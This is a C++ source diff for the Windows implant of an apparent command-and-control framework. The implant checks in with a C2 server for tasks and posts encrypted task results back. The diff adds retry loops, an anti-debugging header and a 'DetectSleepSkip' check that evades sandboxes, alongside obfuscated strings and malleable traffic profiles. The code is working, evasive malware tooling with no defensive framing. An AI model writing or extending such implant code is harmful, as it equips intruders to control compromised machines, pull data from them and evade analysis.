@@ -10,12 +10,12 @@
 #include "debug.h"
 #include "utils.h"
 #include "constants.h"
+#include "antidebug.h"
 #include <string>
 #include <iostream>
 
 using namespace std;
 using namespace andrivet::ADVobfuscator;
-
 
 MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string privKey)
 {
@@ -61,7 +61,6 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
     // We still need to decrypt the config
     string decryptedConfig = decryptB64String(b64ServerPubKey, privKey, c_str);
 
-
     return parseMalleableConfig(decryptedConfig, privKey);
 }
 
@@ -74,24 +73,39 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
     string authCookieString = oss.str();
     std::wstring authCookie(authCookieString.begin(), authCookieString.end());
     DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());
-    string res = HTTPRequest(L"GET", serverUrl, toWide(CHECKIN_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->cookie), authCookie.c_str(), NULL, 0, outSize, USE_TLS);
 
-    if (res.empty())
+    int reqCtr = 0;
+    while (reqCtr < profile->maxRetries)
     {
-        DEBUG_PRINTF("Checkin failed\n");
-        return NULL;
+        DEBUG_PRINTF("Checkin attempt %d\n", reqCtr);
+        string res = HTTPRequest(L"GET", serverUrl, toWide(CHECKIN_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->userAgent), authCookie.c_str(), NULL, 0, outSize, USE_TLS);
+
+        if (res.empty())
+        {
+            DEBUG_PRINTF("Checkin failed\n");
+            reqCtr++;
+            if (DetectSleepSkip(profile->retryWait))
+            {
+                DEBUG_PRINTF("Sleep skip detected, skipping checkin\n");
+                return NULL;
+            }
+            continue;
+        }
+
+        DEBUG_PRINTF("Checkin done\n");
+        DEBUG_PRINTF("Response: %s\n", res.c_str());
+        // decode and decrypt the response
+        string resDecoded = decryptB64String(profile->base64ServerPublicKey,
+                                             profile->base64EncryptionKey,
+                                             res);
+
+        DEBUG_PRINTF("Checkin response: %s\n", resDecoded.c_str());
+
+        return parseTask(resDecoded);
     }
-
-    DEBUG_PRINTF("Checkin done\n");
-    DEBUG_PRINTF("Response: %s\n", res.c_str());
-    // decode and decrypt the response
-    string resDecoded = decryptB64String(profile->base64ServerPublicKey,
-                                         profile->base64EncryptionKey,
-                                         res);
-
-    DEBUG_PRINTF("Checkin response: %s\n", resDecoded.c_str());
-    
-    return parseTask(resDecoded);
+    // If we get here, we failed to checkin, so exit
+    DEBUG_PRINTF("Failed to checkin, exiting\n");
+    exit(0);
 }
 
 bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool success, MalleableProfile *profile)
@@ -102,7 +116,7 @@ bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool 
         "tid": taskId,
         "output": "base64 encoded results"
     }
-    
+
     */
 
     // JSON encode the results
@@ -136,12 +150,38 @@ bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool 
     string authCookieString = oss.str();
     std::wstring authCookie(authCookieString.begin(), authCookieString.end());
 
-    // Send the results
-    PSIZE_T outSize = 0;
-    string res = HTTPRequest(L"POST", serverUrl, toWide(TASK_RESULTS_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->cookie), authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, USE_TLS);
-    
-    DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());
+    int reqCtr = 0;
+    while (reqCtr < profile->maxRetries)
+    {
+        DEBUG_PRINTF("SendTaskResult attempt %d\n", reqCtr);
+        // Send the results
+        PSIZE_T outSize = 0;
+        string res = HTTPRequest(L"POST", serverUrl, toWide(TASK_RESULTS_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->userAgent), authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, USE_TLS);
 
-    return res.c_str() == OBFUSCATED("OK");
+        DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());
+        if (res.empty())
+        {
+            DEBUG_PRINTF("SendTaskResult failed\n");
+            reqCtr++;
+            if (DetectSleepSkip(profile->retryWait))
+            {
+                DEBUG_PRINTF("Sleep skip detected, skipping SendTaskResult\n");
+                return false;
+            }
+            continue;
+        }
+        DEBUG_PRINTF("SendTaskResult done\n");
+        return res.c_str() == OBFUSCATED("OK");
+    }
+    // If we get here, we failed to send the results, so exit
+    DEBUG_PRINTF("Failed to send results, exiting\n");
+    exit(0);
 
+    // // Send the results
+    // PSIZE_T outSize = 0;
+    // string res = HTTPRequest(L"POST", serverUrl, toWide(TASK_RESULTS_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->userAgent), authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, USE_TLS);
+
+    // DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());
+
+    // return res.c_str() == OBFUSCATED("OK");
 }
